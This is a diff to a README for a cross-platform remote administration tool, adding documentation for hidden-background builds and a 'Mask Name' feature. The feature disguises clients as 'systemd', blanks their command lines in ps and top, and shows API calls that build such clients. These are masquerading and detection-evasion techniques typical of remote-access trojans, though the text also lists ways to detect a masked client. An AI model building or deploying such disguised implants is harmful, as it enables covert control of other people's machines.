@@ -65,7 +65,8 @@ THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS
 | `Screenshot`    |    X    |    X   |   X    |
 | `File Explorer` |    X    |    X   |   X    |
 | `Get OS Info`   |    X    |    X   |   X    |
-| `Run Hidden`    |    X    |        |        |
+| `Run Hidden`    |    X    |    X   |   X    |
+| `Mask Name`     |         |    X   |   X    |
 | `Restart`       |    X    |    X   |   X    |
 | `Shutdown`      |    X    |    X   |   X    |
 | `Lock screen`   |    X    |        |   X    |
@@ -79,6 +80,12 @@ $ xattr -d com.apple.quarantine <binary>
 ```
 
 The agent needs Screen Recording permission for screenshots, and Accessibility/Automation permissions for lock, sign out, restart and shutdown (System Settings → Privacy & Security).
+
+Enabling **Run Hidden/Background** builds the client so it starts without a console: on Windows the binary uses the `windowsgui` subsystem, and on Linux/macOS it detaches into its own session with stdout/stderr discarded, returning control to the terminal immediately. When no filename is given, hidden builds are named `systemd` on Linux and `.systemd` on macOS.
+
+**Mask Name** additionally hides the process from process listings on Linux and macOS: it is renamed at runtime and on Linux the command line is cleared, so `ps -ef | grep <name>` and `top` show a blank command. It is not available on Windows, because a process cannot be renamed at runtime there.
+
+Remaining ways to spot a masked client: `/proc/<pid>/exe`, `lsof`, listener sockets, and the file on disk.
 
 ## Quick start
 
@@ -182,7 +189,7 @@ Devices are identified by their MAC address (`client_id`). The base64 form retur
 | `POST` | `/devices/:id/files` | Upload a multipart `file` (optional `path` destination). |
 | `DELETE` | `/devices/:id/files?path=` | Delete a file on the device. |
 | `GET` | `/targets` | List client build targets and architectures. |
-| `POST` | `/clients` | Build a client (`server_address`, `server_port`, `os_target`, `os_arch`, `filename`, `run_hidden`). |
+| `POST` | `/clients` | Build a client (`server_address`, `server_port`, `os_target`, `os_arch`, `filename`, `run_hidden`, `mask_name`). |
 | `GET` | `/clients/:filename` | Download a built client. |
 
 Examples:
@@ -202,10 +209,10 @@ $ curl -s -X POST http://localhost:8080/api/v1/devices/AA:BB:CC:DD:EE:FF/files \
     -H 'Authorization: Bearer <JWT>' \
     -F file=@./payload.txt -F path=/home/user/payload.txt
 
-# Build a macOS (Apple Silicon) client
+# Build a macOS (Apple Silicon) client that runs hidden and masked
 $ curl -s -X POST http://localhost:8080/api/v1/clients \
     -H 'Authorization: Bearer <JWT>' -H 'Content-Type: application/json' \
-    -d '{"os_target":"darwin","os_arch":"arm64","filename":"agent"}'
+    -d '{"os_target":"darwin","os_arch":"arm64","run_hidden":true,"mask_name":true}'
 ```
 
 Building clients runs `go build` on the server, so the Go toolchain must be available. CORS is enabled for browser-based callers.
